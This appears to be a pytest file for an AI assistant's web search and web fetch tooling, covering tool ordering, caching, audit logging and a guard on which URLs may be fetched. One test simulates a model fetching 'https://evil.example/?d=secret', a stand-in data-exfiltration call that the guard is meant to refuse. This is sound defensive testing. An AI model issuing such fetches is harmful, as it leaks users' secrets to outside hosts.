"""Unit tests for Anthropic's native web_search server tool wiring.

Covers the tool dict shape, the Executive's tool-assembly order (server tool
is appended after the cached client-tool list so cache_control stays on a
client-side tool), the response-block handling for server_tool_use and
web_search_tool_result, and audit logging of search queries.
"""
from __future__ import annotations

import asyncio
import os
from collections.abc import Iterator
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

os.environ.setdefault("ANTHROPIC_API_KEY", "sk-test-not-used")

import pytest

from openexecutive.config import get_settings

_SEARCH_ENV_KEYS = (
    "ENABLE_WEB_SEARCH",
    "WEB_SEARCH_MAX_USES",
    "WEB_SEARCH_ALLOWED_DOMAINS",
    "WEB_SEARCH_BLOCKED_DOMAINS",
    "WEB_FETCH_MAX_USES",
    "SEARXNG_URL",
)


@pytest.fixture(autouse=True)
def _restore_search_env() -> Iterator[None]:
    """Undo every os.environ write this module makes, after each test.

    ``_reset_settings_cache`` writes os.environ directly and leaves
    ENABLE_WEB_SEARCH=false behind. Without a restore, any module that runs
    later and relies on the default (search on) silently sees it off — the
    standing-query tests did, once this module sorted ahead of them.

    A plain snapshot, not ``monkeypatch.delenv``: delenv on a key that is
    absent records nothing, so it restores nothing — and absent is exactly
    the state these keys start in.
    """
    saved = {key: os.environ.get(key) for key in _SEARCH_ENV_KEYS}
    yield
    for key, value in saved.items():
        if value is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = value


@pytest.fixture(autouse=True)
def _no_audit_writes(monkeypatch: pytest.MonkeyPatch) -> None:
    """Keep this module's `memory_extraction` rows out of the default
    `./episodic_memory.db`.

    Driving a turn schedules episodic extraction fire-and-forget, and its
    audit row goes through `audit.log_event`, which targets the default DB
    whatever `db_path` the extraction was handed. Those rows surface as real
    data in other modules' assertions during a full run only — the audit-log
    pollution trap in CLAUDE.md.
    """
    monkeypatch.setattr(
        "openexecutive.audit.log_event", lambda *a, **kw: None, raising=False
    )



def _reset_settings_cache() -> None:
    # get_settings constructs a fresh Settings() each call, so just clear envs.
    # ENABLE_WEB_SEARCH defaults to True in config.py; pin it false here so
    # the "disabled" cases below have a clean baseline (tests that want it
    # enabled explicitly set ENABLE_WEB_SEARCH=true after reset).
    for k in _SEARCH_ENV_KEYS:
        os.environ.pop(k, None)
    os.environ["ENABLE_WEB_SEARCH"] = "false"


# ---------------------------------------------------------------------------
# build_web_search_tool
# ---------------------------------------------------------------------------


def test_build_returns_none_when_disabled() -> None:
    _reset_settings_cache()
    from openexecutive.orchestrator.web_search_tool import build_web_search_tool
    assert build_web_search_tool() is None


def test_build_returns_anthropic_server_tool_dict_when_enabled() -> None:
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    os.environ["WEB_SEARCH_MAX_USES"] = "3"
    try:
        from openexecutive.orchestrator.web_search_tool import build_web_search_tool
        tool = build_web_search_tool()
        assert tool is not None
        assert tool["type"] == "web_search_20250305"
        assert tool["name"] == "web_search"
        assert tool["max_uses"] == 3
        # No allowed/blocked domains set — keys must be absent.
        assert "allowed_domains" not in tool
        assert "blocked_domains" not in tool
    finally:
        _reset_settings_cache()


def test_build_includes_allowed_domains_when_configured() -> None:
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    os.environ["WEB_SEARCH_ALLOWED_DOMAINS"] = "wsj.com, ft.com"
    try:
        from openexecutive.orchestrator.web_search_tool import build_web_search_tool
        tool = build_web_search_tool()
        assert tool is not None
        assert tool["allowed_domains"] == ["wsj.com", "ft.com"]
    finally:
        _reset_settings_cache()


def test_config_rejects_both_allow_and_block_lists() -> None:
    _reset_settings_cache()
    os.environ["WEB_SEARCH_ALLOWED_DOMAINS"] = "a.com"
    os.environ["WEB_SEARCH_BLOCKED_DOMAINS"] = "b.com"
    try:
        with pytest.raises(ValueError):
            get_settings()
    finally:
        _reset_settings_cache()


def test_config_rejects_zero_max_uses() -> None:
    _reset_settings_cache()
    os.environ["WEB_SEARCH_MAX_USES"] = "0"
    try:
        with pytest.raises(ValueError):
            get_settings()
    finally:
        _reset_settings_cache()


# ---------------------------------------------------------------------------
# Persona addendum is added only when feature is enabled
# ---------------------------------------------------------------------------


def test_persona_includes_web_search_addendum_when_enabled() -> None:
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    try:
        from openexecutive.prompts.cache_manager import build_system_blocks
        blocks = build_system_blocks(company_profile=None, mcp_enabled=False)
        persona_text = blocks[0]["text"]
        assert "web_search" in persona_text
    finally:
        _reset_settings_cache()


def test_persona_omits_web_search_addendum_when_disabled() -> None:
    _reset_settings_cache()
    from openexecutive.prompts.cache_manager import build_system_blocks
    blocks = build_system_blocks(company_profile=None, mcp_enabled=False)
    persona_text = blocks[0]["text"]
    assert "Web Search" not in persona_text


def test_persona_omits_addendum_when_the_caller_has_no_search_tool() -> None:
    """ENABLE_WEB_SEARCH is not the whole answer.

    A local model with no SEARXNG_URL gets no search tool despite the flag.
    Promising one produces confident claims that it searched.
    """
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    from openexecutive.prompts.cache_manager import build_system_blocks
    blocks = build_system_blocks(
        company_profile=None, mcp_enabled=False, web_search_available=False
    )
    assert "web_search" not in blocks[0]["text"]


def test_persona_includes_addendum_when_the_caller_has_a_search_tool() -> None:
    """The client-side tool counts, even though the global flag alone would too."""
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "false"
    from openexecutive.prompts.cache_manager import build_system_blocks
    blocks = build_system_blocks(
        company_profile=None, mcp_enabled=False, web_search_available=True
    )
    assert "web_search" in blocks[0]["text"]


def test_addendum_gate_keeps_the_block_byte_stable() -> None:
    """Two stable variants, not per-request text — the block is cached for 1h."""
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    from openexecutive.prompts.cache_manager import build_system_blocks
    a = build_system_blocks(company_profile=None, mcp_enabled=False,
                            web_search_available=True)
    b = build_system_blocks(company_profile=None, mcp_enabled=False,
                            web_search_available=True)
    assert a[0]["text"] == b[0]["text"]
    off = build_system_blocks(company_profile=None, mcp_enabled=False,
                              web_search_available=False)
    assert off[0]["text"] != a[0]["text"]


# ---------------------------------------------------------------------------
# Executive tool-assembly order
# ---------------------------------------------------------------------------


def _make_stream_cm(final_msg: object) -> MagicMock:
    """Async context manager mimicking AsyncAnthropic().messages.stream()."""
    cm = MagicMock()
    cm.__aenter__ = AsyncMock(return_value=cm)
    cm.__aexit__ = AsyncMock(return_value=None)

    async def _aiter():
        # No content deltas — we only care about final_msg.
        if False:
            yield None  # pragma: no cover

    cm.__aiter__ = lambda self=cm: _aiter()
    cm.get_final_message = AsyncMock(return_value=final_msg)
    return cm


def test_executive_appends_web_search_after_cached_client_tools() -> None:
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    try:
        from openexecutive.orchestrator.executive import Executive
        from openexecutive.orchestrator.session import Session

        # Drive one loop iteration with a no-tool response so we can inspect
        # the tool list the SDK was called with.
        final_msg = SimpleNamespace(
            content=[SimpleNamespace(type="text", text="done")],
            stop_reason="end_turn",
        )
        captured_tools: list[list[dict]] = []

        def fake_stream(**kwargs):
            captured_tools.append(kwargs["tools"])
            return _make_stream_cm(final_msg)

        exec_ = Executive()
        fake_provider = SimpleNamespace(messages_stream=fake_stream)

        async def _run() -> None:
            session = Session(session_id="t1")
            chunks: list = []
            async for c in exec_.stream_chat("hi", session):
                chunks.append(c)

        with patch(
            "openexecutive.orchestrator.executive.get_provider",
            return_value=fake_provider,
        ):
            asyncio.run(_run())
        assert captured_tools, "stream() was not invoked"
        tools = captured_tools[0]
        # Web search must be present and must be last (so it stays out of the
        # cache_control slot, which is reserved for client-side tools).
        assert tools[-1]["name"] == "web_search"
        assert tools[-1]["type"] == "web_search_20250305"
        # The last client-side tool (second-to-last overall) is the one that
        # carries cache_control. Web search must NOT carry cache_control.
        assert "cache_control" not in tools[-1]
        assert tools[-2].get("cache_control") == {"type": "ephemeral", "ttl": "1h"}
        # web_fetch is the client tool even beside the server search: a
        # function tool inside the sorted, cached list, never Anthropic's.
        fetch = [t for t in tools if t["name"] == "web_fetch"]
        assert len(fetch) == 1 and "input_schema" in fetch[0] and "type" not in fetch[0]
        assert tools.index(fetch[0]) < len(tools) - 1
    finally:
        _reset_settings_cache()


def test_executive_omits_web_fetch_when_its_budget_is_zero() -> None:
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    os.environ["WEB_FETCH_MAX_USES"] = "0"
    try:
        from openexecutive.orchestrator.executive import Executive
        from openexecutive.orchestrator.session import Session

        final_msg = SimpleNamespace(
            content=[SimpleNamespace(type="text", text="done")], stop_reason="end_turn",
        )
        captured_tools: list[list[dict]] = []

        def fake_stream(**kwargs):
            captured_tools.append(kwargs["tools"])
            return _make_stream_cm(final_msg)

        async def _run() -> None:
            async for _ in Executive().stream_chat("hi", Session(session_id="t1b")):
                pass

        with patch(
            "openexecutive.orchestrator.executive.get_provider",
            return_value=SimpleNamespace(messages_stream=fake_stream),
        ):
            asyncio.run(_run())
        names = [t.get("name") for t in captured_tools[0]]
        assert names[-1] == "web_search"
        assert "web_fetch" not in names
    finally:
        _reset_settings_cache()


def _tool_lists_for_turn(final_msgs: list[object], during_round=None) -> list[list[dict]]:
    """Drive one stream_chat turn whose model rounds return ``final_msgs`` in
    order, and return the tool list each round was sent. ``during_round(i)``
    runs once round ``i``'s tool list is built, standing in for what that
    round's tools then do."""
    from openexecutive.orchestrator.executive import Executive
    from openexecutive.orchestrator.session import Session

    captured: list[list[dict]] = []

    def fake_stream(**kwargs):
        if during_round is not None:
            during_round(len(captured))
        captured.append(kwargs["tools"])
        return _make_stream_cm(final_msgs[len(captured) - 1])

    async def _run() -> None:
        async for _ in Executive().stream_chat("hi", Session(session_id="t-fetch-drop")):
            pass

    with patch(
        "openexecutive.orchestrator.executive.get_provider",
        return_value=SimpleNamespace(messages_stream=fake_stream),
    ):
        asyncio.run(_run())
    return captured


def test_a_private_turn_is_never_offered_web_fetch() -> None:
    """A turn that carries a contact's mail must not open a URL its text
    names; the client fetch is in PRIVATE_TURN_WITHHELD_TOOLS beside the
    server search, which stays."""
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    try:
        done = SimpleNamespace(
            content=[SimpleNamespace(type="text", text="done")], stop_reason="end_turn",
        )
        with patch(
            "openexecutive.orchestrator.executive.turn_is_private_to_principal",
            return_value=True,
        ):
            tools = _tool_lists_for_turn([done])[0]
        names = [t.get("name") for t in tools]
        assert names[-1] == "web_search"
        assert "web_fetch" not in names
    finally:
        _reset_settings_cache()


def test_a_mail_read_leaves_the_tool_list_unchanged() -> None:
    """Mail-touched is decided mid-turn, and web_fetch is a client tool the
    dispatch guard and its handler refuse from then on, so the list (the
    cached prefix) is the same in every round."""
    from openexecutive.delegation.settings import TurnDelegation

    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    try:
        pinned = TurnDelegation()
        # A tool the loop does not know: refused with an error result, which
        # is enough to send a second round.
        calls = SimpleNamespace(
            content=[SimpleNamespace(
                type="tool_use", id="toolu_1", name="no_such_tool", input={},
            )],
            stop_reason="tool_use",
        )
        done = SimpleNamespace(
            content=[SimpleNamespace(type="text", text="done")], stop_reason="end_turn",
        )

        def round_one_reads_mail(i: int) -> None:
            if i == 0:
                pinned.read_mail = True

        with patch(
            "openexecutive.orchestrator.executive.turn_delegation", return_value=pinned,
        ):
            first, second = _tool_lists_for_turn([calls, done], round_one_reads_mail)
        assert "web_fetch" in [t.get("name") for t in first]
        assert second == first
    finally:
        _reset_settings_cache()


def test_executive_omits_web_search_when_disabled() -> None:
    _reset_settings_cache()
    from openexecutive.orchestrator.executive import Executive
    from openexecutive.orchestrator.session import Session

    final_msg = SimpleNamespace(
        content=[SimpleNamespace(type="text", text="done")],
        stop_reason="end_turn",
    )
    captured_tools: list[list[dict]] = []

    def fake_stream(**kwargs):
        captured_tools.append(kwargs["tools"])
        return _make_stream_cm(final_msg)

    exec_ = Executive()
    fake_provider = SimpleNamespace(messages_stream=fake_stream)

    async def _run() -> None:
        session = Session(session_id="t2")
        async for _ in exec_.stream_chat("hi", session):
            pass

    with patch(
        "openexecutive.orchestrator.executive.get_provider",
        return_value=fake_provider,
    ):
        asyncio.run(_run())
    names = {t.get("name") for t in captured_tools[0]}
    assert "web_search" not in names
    assert "web_fetch" not in names


# ---------------------------------------------------------------------------
# server_tool_use / web_search_tool_result preservation + audit log
# ---------------------------------------------------------------------------


def _server_tool_block(query: str, block_id: str = "srvtoolu_1") -> MagicMock:
    block = MagicMock()
    block.type = "server_tool_use"
    block.id = block_id
    block.name = "web_search"
    block.input = {"query": query}
    block.model_dump.return_value = {
        "type": "server_tool_use",
        "id": block_id,
        "name": "web_search",
        "input": {"query": query},
    }
    return block


def _web_result_block(tool_use_id: str = "srvtoolu_1") -> MagicMock:
    block = MagicMock()
    block.type = "web_search_tool_result"
    block.tool_use_id = tool_use_id
    block.model_dump.return_value = {
        "type": "web_search_tool_result",
        "tool_use_id": tool_use_id,
        "content": [{"type": "web_search_result", "url": "https://x", "title": "T"}],
    }
    return block


def test_server_tool_blocks_are_preserved_and_audited() -> None:
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    try:
        from openexecutive.orchestrator.executive import Executive
        from openexecutive.orchestrator.session import Session

        text_block = SimpleNamespace(type="text", text="Based on my search...")
        final_msg = SimpleNamespace(
            content=[
                _server_tool_block("current EUR/USD"),
                _web_result_block(),
                text_block,
            ],
            stop_reason="end_turn",
        )

        def fake_stream(**_kwargs):
            return _make_stream_cm(final_msg)

        exec_ = Executive()
        fake_provider = SimpleNamespace(messages_stream=fake_stream)

        audit_calls: list[dict] = []

        def _capture(event_type, summary, **kwargs):
            audit_calls.append({"event_type": event_type, "summary": summary, **kwargs})

        with (
            patch(
                "openexecutive.orchestrator.executive.get_provider",
                return_value=fake_provider,
            ),
            patch(
                "openexecutive.orchestrator.executive.audit_log", side_effect=_capture
            ),
        ):
            async def _run() -> str:
                return await exec_.chat("hi", Session(session_id="t3"))
            asyncio.run(_run())

        ws_calls = [c for c in audit_calls if c["event_type"] == "tool_invocation"
                    and "web_search" in c["summary"]]
        assert len(ws_calls) == 1
        assert "current EUR/USD" in ws_calls[0]["summary"]
        assert ws_calls[0]["actor"] == "executive"
        assert ws_calls[0]["details"]["tool"] == "web_search"
        assert ws_calls[0]["details"]["kind"] == "server_tool"
    finally:
        _reset_settings_cache()


def test_a_server_search_result_can_be_fetched_and_nothing_else_can() -> None:
    """Beside the server search, web_fetch is the client tool: a result URL
    the search returned becomes openable, as the SearXNG tool's do, while a
    URL only a tool result named stays refused."""
    _reset_settings_cache()
    os.environ["ENABLE_WEB_SEARCH"] = "true"
    try:
        from anthropic.types import (
            ServerToolUseBlock,
            WebSearchResultBlock,
            WebSearchToolResultBlock,
        )

        from openexecutive.agents.tool_outcome import ToolOutcome
        from openexecutive.orchestrator.executive import Executive
        from openexecutive.orchestrator.session import Session

        found = "https://r.example/a"
        search_use = ServerToolUseBlock(
            type="server_tool_use", id="srvtoolu_1", name="web_search", input={"query": "ciao"},
        )
        search_result = WebSearchToolResultBlock(
            type="web_search_tool_result", tool_use_id="srvtoolu_1",
            content=[WebSearchResultBlock(
                type="web_search_result", url=found, title="A", encrypted_content="enc",
            )],
        )
        fetches = [
            SimpleNamespace(type="tool_use", id="tu_1", name="web_fetch", input={"url": found}),
            SimpleNamespace(
                type="tool_use", id="tu_2", name="web_fetch",
                input={"url": "https://evil.example/?d=secret"},
            ),
        ]
        finals = [
            SimpleNamespace(content=[search_use, search_result], stop_reason="tool_use"),
            SimpleNamespace(content=fetches, stop_reason="tool_use"),
            SimpleNamespace(content=[SimpleNamespace(type="text", text="done")], stop_reason="end_turn"),
        ]
        captured: list[dict] = []

        def fake_stream(**kwargs):
            captured.append(kwargs)
            return _make_stream_cm(finals[len(captured) - 1])

        run_fetch = AsyncMock(return_value=ToolOutcome('{"content": "page"}'))
        with (
            patch(
                "openexecutive.orchestrator.executive.get_provider",
                return_value=SimpleNamespace(messages_stream=fake_stream),
            ),
            patch("openexecutive.orchestrator.executive.audit_log"),
            patch("openexecutive.orchestrator.web_fetch._run_fetch", new=run_fetch),
        ):
            asyncio.run(Executive().chat("hi", Session(session_id="t4")))

        assert [c.args[0] for c in run_fetch.await_args_list] == [found]
        results = {
            b["tool_use_id"]: b for m in captured[2]["messages"] if m["role"] == "user"
            and isinstance(m["content"], list) for b in m["content"]
            if isinstance(b, dict) and b.get("type") == "tool_result"
        }
        assert not results["tu_1"].get("is_error")
        assert results["tu_2"].get("is_error") and "has not appeared" in str(results["tu_2"]["content"])
    finally:
        _reset_settings_cache()


# ---------------------------------------------------------------------------
# client_search_handlers: which handlers a turn (or a research call) gets
# ---------------------------------------------------------------------------


def _client_selection(fetch: bool = True):
    from openexecutive.orchestrator.searxng_search import SEARXNG_WEB_SEARCH_TOOL
    from openexecutive.orchestrator.web_fetch import WEB_FETCH_TOOL
    from openexecutive.orchestrator.web_search_tool import WebSearchSelection

    return WebSearchSelection(
        "client", SEARXNG_WEB_SEARCH_TOOL, 2, WEB_FETCH_TOOL if fetch else None, 3 if fetch else 0,
    )


def test_client_handlers_without_a_seen_set_are_search_only() -> None:
    """The research fan-out and standing queries pass no seen set: they keep
    the one search handler they always had, fetch tool or not."""
    from openexecutive.orchestrator.web_search_tool import client_search_handlers

    assert set(client_search_handlers(_client_selection())) == {"web_search"}


def test_client_handlers_with_a_seen_set_add_fetch_only_when_selected() -> None:
    from openexecutive.orchestrator.web_fetch import SeenUrls
    from openexecutive.orchestrator.web_search_tool import (
        WebSearchSelection,
        client_search_handlers,
    )

    assert set(client_search_handlers(_client_selection(), SeenUrls())) == {"web_search", "web_fetch"}
    assert set(client_search_handlers(_client_selection(fetch=False), SeenUrls())) == {"web_search"}
    # The server search runs inside the generation; the fetch beside it is
    # still the client tool, so it gets a handler, but only with a seen set.
    server = WebSearchSelection("server", {"name": "web_search"}, 2, {"name": "web_fetch"}, 3)
    assert set(client_search_handlers(server, SeenUrls())) == {"web_fetch"}
    assert client_search_handlers(server) == {}
    assert client_search_handlers(None, SeenUrls()) == {}


def test_search_results_join_the_seen_set_and_the_fetch_budget_is_its_own() -> None:
    """A result URL becomes fetchable once the search returns it, and the two
    tools spend separate budgets (searches: 2, fetches: 3)."""
    import json

    from openexecutive.agents.tool_outcome import ToolOutcome
    from openexecutive.orchestrator.web_fetch import SeenUrls
    from openexecutive.orchestrator.web_search_tool import client_search_handlers

    os.environ["SEARXNG_URL"] = "http://searxng:8080"
    seen = SeenUrls()
    handlers = client_search_handlers(_client_selection(), seen)
    payload = json.dumps({"results": [{"url": "https://r.example/a", "title": "A", "content": "s"}]})
    run_fetch = AsyncMock(return_value=ToolOutcome('{"content": "page"}'))
    with (
        patch(
            "openexecutive.orchestrator.searxng_search._fetch_capped",
            new=AsyncMock(return_value=payload.encode()),
        ),
        patch("openexecutive.orchestrator.web_fetch._run_fetch", new=run_fetch),
    ):
        async def _go() -> list[ToolOutcome]:
            before = await handlers["web_fetch"]({"url": "https://r.example/a"})
            await handlers["web_search"]({"query": "ciao"})
            after = [await handlers["web_fetch"]({"url": "https://r.example/a"}) for _ in range(4)]
            return [before, *after]

        outcomes = asyncio.run(_go())
    assert seen.allows("https://r.example/a")
    assert outcomes[0].is_error and "has not appeared" in outcomes[0].content
    assert [o.is_error for o in outcomes[1:]] == [False, False, False, True]
    assert "budget" in outcomes[-1].content
    assert run_fetch.await_count == 3
